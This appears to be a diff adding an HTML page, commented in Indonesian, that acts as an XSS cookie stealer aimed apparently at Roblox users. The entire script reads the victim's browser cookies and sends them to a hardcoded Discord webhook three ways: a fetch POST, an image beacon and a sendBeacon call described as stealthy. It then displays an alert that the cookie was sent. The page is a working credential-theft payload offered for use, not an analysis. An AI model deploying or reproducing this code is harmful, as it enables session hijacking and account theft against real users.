@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Cookie Stealer Roblox - Discord Webhook</title>
+</head>
+<body>
+  <h2>Halaman XSS Cookie Stealer Roblox</h2>
+  <p>Jika kamu membaca ini, script XSS sudah aktif!</p>
+
+  <script>
+    // Ambil seluruh cookie di browser korban
+    const cookie = document.cookie;
+
+    // Webhook Discord kamu
+    const webhook = "https://discord.com/api/webhooks/1378059141653725287/iKIL8S5KOQ9s02BNKx2Vy38hBkGwgd9Jifpr_ZxOSUVGqN_ugSEDiez-i7rEY2HWPIah";
+
+    // VARIASI 1: fetch (POST)
+    fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "COOKIE STEAL (fetch): ```" + cookie + "```"
+      })
+    });
+
+    // VARIASI 2: image beacon (GET)
+    (new Image()).src = webhook + "?wait=true&content=COOKIE%20STEAL%20(img):%20" + encodeURIComponent(cookie);
+
+    // VARIASI 3: sendBeacon (POST, stealth)
+    if (navigator.sendBeacon) {
+      const data = JSON.stringify({
+        content: "COOKIE STEAL (beacon): ```" + cookie + "```"
+      });
+      navigator.sendBeacon(webhook, data);
+    }
+
+    // Untuk demo, tampilkan alert
+    alert("XSS aktif! Cookie sudah dikirim ke Discord.");
+  </script>
+</body>
+</html>
